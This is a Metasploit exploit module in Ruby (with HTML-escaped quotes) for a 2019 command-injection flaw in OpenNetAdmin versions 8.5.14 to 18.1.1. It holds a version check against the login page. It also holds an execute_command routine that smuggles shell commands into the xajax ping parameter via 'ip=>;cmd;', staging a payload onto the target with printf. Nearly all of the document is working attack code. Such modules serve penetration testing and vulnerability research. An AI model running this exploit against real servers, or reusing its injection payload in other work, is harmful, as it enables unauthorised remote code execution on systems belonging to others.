# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;OpenNetAdmin Ping Command Injection&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1.
      },
      &#039;Author&#039;          =>
        [
          &#039;mattpascoe&#039;, # Vulnerability discovery and exploit
          &#039;Onur ER <onur@onurer.net>&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;EDB&#039;, &#039;47691&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;2019-11-19&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;      => false,
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic Target&#039;, {}]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;RPORT&#039;   => 80,
        },
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptString.new(&#039;VHOST&#039;, [false, &#039;HTTP server virtual host&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/ona/login.php&#039;])
      ]
    )
    deregister_options(&#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    res = send_request_cgi({
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;uri&#039;           => normalize_uri(target_uri.path),
      &#039;ctype&#039;         => &#039;application/x-www-form-urlencoded&#039;,
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039;     => {
        &#039;xajax&#039;       => &#039;window_open&#039;,
        &#039;xajaxargs[]&#039; => &#039;app_about&#039;
      }
     })

    unless res
      return CheckCode::Unknown &#039;Connection failed&#039;
    end

    unless res.body =~ /OpenNetAdmin/i
      return CheckCode::Safe
    end

    opennetadmin_version = res.body.scan(/OpenNetAdmin - v([\d\.]+)/).flatten.first
    version = Gem::Version.new(opennetadmin_version)

    if version
      vprint_status "OpenNetAdmin version #{version}"
    end

    if version.between?(Gem::Version.new(&#039;8.5.14&#039;), Gem::Version.new(&#039;18.1.1&#039;))
      return CheckCode::Appears
    end

    CheckCode::Detected
  end

  def exploit
    print_status(&#039;Exploiting...&#039;)
    execute_cmdstager(flavor: :printf)
  end

  def execute_command(cmd, opts = {})
    begin
      send_request_cgi({
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;uri&#039;           => normalize_uri(target_uri.path),
        &#039;ctype&#039;         => &#039;application/x-www-form-urlencoded&#039;,
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039;     => {
          &#039;xajax&#039;       => &#039;window_submit&#039;,
          &#039;xajaxargs[]&#039; => [&#039;tooltips&#039;, "ip=>;#{CGI.escape(cmd)};", &#039;ping&#039;]
        }
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

